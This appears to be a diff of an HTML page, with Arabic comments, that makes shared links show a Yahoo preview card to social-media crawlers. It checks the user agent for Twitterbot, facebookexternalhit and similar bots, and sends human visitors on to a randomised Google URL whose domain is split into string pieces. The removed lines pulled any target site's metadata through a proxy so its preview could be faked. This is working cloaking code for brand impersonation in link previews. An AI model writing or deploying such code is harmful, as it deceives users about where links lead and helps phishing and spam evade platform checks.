@@ -1,64 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>Loading Preview...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
+  <!-- 1. وسوم معاينة موقع Yahoo المباشرة والثابتة لـ Twitterbot ليعرضها فورًا -->
+  <title>Yahoo | Mail, Weather, Search, Politics, Finance, Sports & News</title>
+  <meta property="og:title" content="Yahoo | Mail, Weather, Search, Politics, Finance, Sports & News">
+  <meta property="og:description" content="A new take on trusted news. Connect with your world at Yahoo.">
+  <meta property="og:image" content="https://yimg.com">
+  
+  <!-- إعدادات بطاقة تويتر الكبيرة لفرض ظهور المعاينة بشعار Yahoo -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Yahoo | Mail, Weather, Search, Politics, Finance, Sports & News">
+  <meta name="twitter:description" content="A new take on trusted news. Connect with your world at Yahoo.">
+  <meta name="twitter:image" content="https://yimg.com">
+
+  <!-- 2. سكربت فحص البوتات والتوجيه العشوائي الفوري للزوار الحقيقيين إلى محرك البحث -->
   <script type="text/javascript">
     (function() {
-      var currentUrl = window.location.href;
-      // استخراج الرابط الثاني المضاف بعد الرابط الأول
-      var targetUrl = currentUrl.split('//').slice(2).join('//'); 
-      
-      if (!targetUrl) {
-        targetUrl = "https://www.yahoo.com"; // رابط افتراضي في حال عدم وجود رابط مضاف
-      } else if (!targetUrl.startsWith("http")) {
-        targetUrl = "https://" + targetUrl;
-      }
-
       var ua = navigator.userAgent || "";
+      // قائمة البوتات الرسمية لمنصات التواصل
       var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
 
+      // إذا كان زائرًا حقيقيًا (وليس بوتاً)، يتم توجيهه فورا وبشكل عشوائي إلى جوجل (حسب كودك الأصلي)
       if (!isBot) {
-        // الزائر الحقيقي: توجيه فوري وعشوائي إلى جوجل
-        var a = "goog"; var b = "le."; var c = "com/?"; var d = Math.ceil(Math.random() * 24);
+        var a = "goog";
+        var b = "le.";
+        var c = "com/?";
+        var d = Math.ceil(Math.random() * 24);
         window.location.replace("https://" + a + b + c + d);
-      } else {
-        // البوت: استخدام وسيط مجاني لجلب وتوليد الميتا تاغز من الموقع المستهدف ديناميكياً
-        var proxyUrl = "https://allorigins.win" + encodeURIComponent(targetUrl);
-        
-        fetch(proxyUrl)
-          .then(response => response.json())
-          .then(data => {
-            var htmlContent = data.contents;
-            
-            // استخراج العنوان والميتا تاغز من الموقع المستهدف (ياهو مثلاً) وحقنها في الصفحة
-            var titleMatch = htmlContent.match(/<title>([^<]+)/i);
-            if (titleMatch) document.title = titleMatch[1];
-
-            var getMeta = function(prop) {
-              var reg = new RegExp('<meta[^>]*?(?:property|name)=["\']' + prop + '["\'][^>]*?content=["\']([^"\']+)["\']|<meta[^>]*?content=["\']([^"\']+)["\'][^>]*?(?:property|name)=["\']' + prop + '["\']', 'i');
-              var match = htmlContent.match(reg);
-              return match ? (match[1] || match[2]) : null;
-            };
-
-            var metaConfig = [
-              { property: "og:title", content: getMeta("og:title") || document.title },
-              { property: "og:description", content: getMeta("og:description") || "Click to view content" },
-              { property: "og:image", content: getMeta("og:image") || "" },
-              { name: "twitter:card", content: "summary_large_image" }
-            ];
-
-            metaConfig.forEach(function(tag) {
-              var metaElement = document.createElement('meta');
-              for (var key in tag) { if (tag[key]) metaElement.setAttribute(key, tag[key]); }
-              document.getElementsByTagName('head')[0].appendChild(metaElement);
-            });
-          }).catch(function() {});
       }
     })();
   </script>
 </head>
 <body>
+  <!-- صفحة فارغة تماماً للبوتات والزوار قبل إعادة التوجيه -->
 </body>
 </html>
